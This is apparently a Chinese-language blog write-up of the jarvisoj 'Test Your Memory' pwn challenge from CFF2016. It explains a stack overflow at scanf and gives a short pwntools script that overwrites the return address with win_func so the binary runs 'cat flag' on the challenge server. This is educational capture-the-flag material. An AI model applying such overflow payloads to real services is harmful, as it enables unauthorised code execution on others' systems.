---
layout:     post
title:      jarvisoj Test Your Memory
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>https://www.jarvisoj.com  
>  
>Problem Description:  
>听说guestbook1很快被人日穿了，出题人表示不服，于是对Guestbook进行了升级，自以为写的很科学~~大家一起鉴定一下。  
>  
>题目来源：CFF2016  
>  
>Download:  
>https://dn.jarvisoj.com/challengefiles/memory.838286edf4b832fd482d58ff1c217561  
>  
>Address:  
>nc pwn2.jarvisoj.com 9876  
<!-- more -->


### 0x00 IDA分析

简单的栈溢出

![](/assets/img/writeup/pwn/2017-07-23-jarvisoj-memory/0x00.png)

在scanf处溢出

![](/assets/img/writeup/pwn/2017-07-23-jarvisoj-memory/0x01.png)

将返回地址覆盖成win_func的地址

![](/assets/img/writeup/pwn/2017-07-23-jarvisoj-memory/0x02.png)

传入'cat flag'

![](/assets/img/writeup/pwn/2017-07-23-jarvisoj-memory/0x03.png)


### 0x01 exploit

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

junk = 'A' * (0x13 + 0x04)
win_func_addr = 0x080485BD
retn_addr = 0x0804871E
bss_cat_flag = 0x080487E0

Io = remote('pwn2.jarvisoj.com', 9876)
payload = junk + p32(win_func_addr) + p32(retn_addr) + p32(bss_cat_flag)
Io.sendline(payload)
Io.recv()
print Io.recv()
```

得到flag

![](/assets/img/writeup/pwn/2017-07-23-jarvisoj-memory/0x04.png)